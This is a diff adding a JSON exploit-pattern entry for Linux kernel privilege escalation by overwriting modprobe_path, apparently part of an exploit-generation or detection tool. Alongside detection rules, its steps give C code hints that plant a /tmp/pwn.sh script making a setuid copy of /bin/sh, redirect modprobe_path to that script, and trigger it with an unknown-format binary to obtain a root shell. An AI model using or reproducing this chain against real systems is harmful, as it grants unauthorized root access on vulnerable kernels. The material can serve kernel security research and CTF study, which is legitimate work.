@@ -1,0 +1,46 @@
+{
+  "name": "modprobe_path_overwrite",
+  "description": "Privilege escalation via overwriting the kernel's modprobe_path variable. When an unknown binary format is executed, the kernel invokes modprobe_path as root. Overwriting it to a user-controlled script achieves root code execution. This is the final escalation step used by many exploit chains.",
+  "target_struct": "modprobe_path (global char array)",
+  "slab_cache": "n/a (kernel .data section)",
+  "technique": "modprobe_path_overwrite",
+  "vuln_types": ["arbitrary-write"],
+  "kernel_versions": "4.4 to 6.1 (hardened in 6.2+)",
+  "detection_rules": {
+    "required_symbols": ["execve", "write", "chmod"],
+    "crash_functions": ["call_modprobe", "__request_module", "do_execveat_common"],
+    "slab_caches": [],
+    "struct_fields": ["modprobe_path"]
+  },
+  "steps": [
+    {
+      "name": "obtain_arb_write",
+      "description": "Use a vulnerability primitive (UAF, OOB write, etc.) to gain a kernel arbitrary write capability. This pattern assumes arb_write is already achieved.",
+      "code_hint": "// arb_write(kernel_addr, user_buf, len) is assumed available"
+    },
+    {
+      "name": "find_modprobe_path",
+      "description": "Locate modprobe_path in kernel memory. It's a fixed-offset global in the .data section. Can be found from System.map or via KASLR base + known offset.",
+      "code_hint": "// From System.map or leak:\n// modprobe_path = kernel_base + MODPROBE_PATH_OFFSET\n// Default value: \"/sbin/modprobe\"\nunsigned long modprobe_addr = kernel_base + 0x_OFFSET_;"
+    },
+    {
+      "name": "write_payload_script",
+      "description": "Create a shell script at a known path that will be executed as root when modprobe is triggered.",
+      "code_hint": "// Create the payload script\nFILE *f = fopen(\"/tmp/pwn.sh\", \"w\");\nfprintf(f, \"#!/bin/sh\\n\");\nfprintf(f, \"cp /bin/sh /tmp/rootsh\\n\");\nfprintf(f, \"chmod u+s /tmp/rootsh\\n\");\nfclose(f);\nchmod(\"/tmp/pwn.sh\", 0755);"
+    },
+    {
+      "name": "overwrite_modprobe_path",
+      "description": "Use arbitrary write to overwrite modprobe_path with the path to our payload script.",
+      "code_hint": "char new_path[] = \"/tmp/pwn.sh\";\narb_write(modprobe_addr, new_path, sizeof(new_path));"
+    },
+    {
+      "name": "trigger_modprobe",
+      "description": "Execute a file with an unknown binary format (magic bytes that don't match any registered binfmt). The kernel will invoke our overwritten modprobe_path as root.",
+      "code_hint": "// Create a file with unknown binary format\nsystem(\"echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger\");\nsystem(\"chmod +x /tmp/trigger\");\n// Execute it - kernel calls modprobe_path as root\nsystem(\"/tmp/trigger\");\n// Now /tmp/rootsh is a root suid shell\nsystem(\"/tmp/rootsh -p\");"
+    }
+  ],
+  "references": [
+    "https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/",
+    "https://blog.wohin.me/posts/linux-kernel-pwn-modprobe-path/"
+  ]
+}
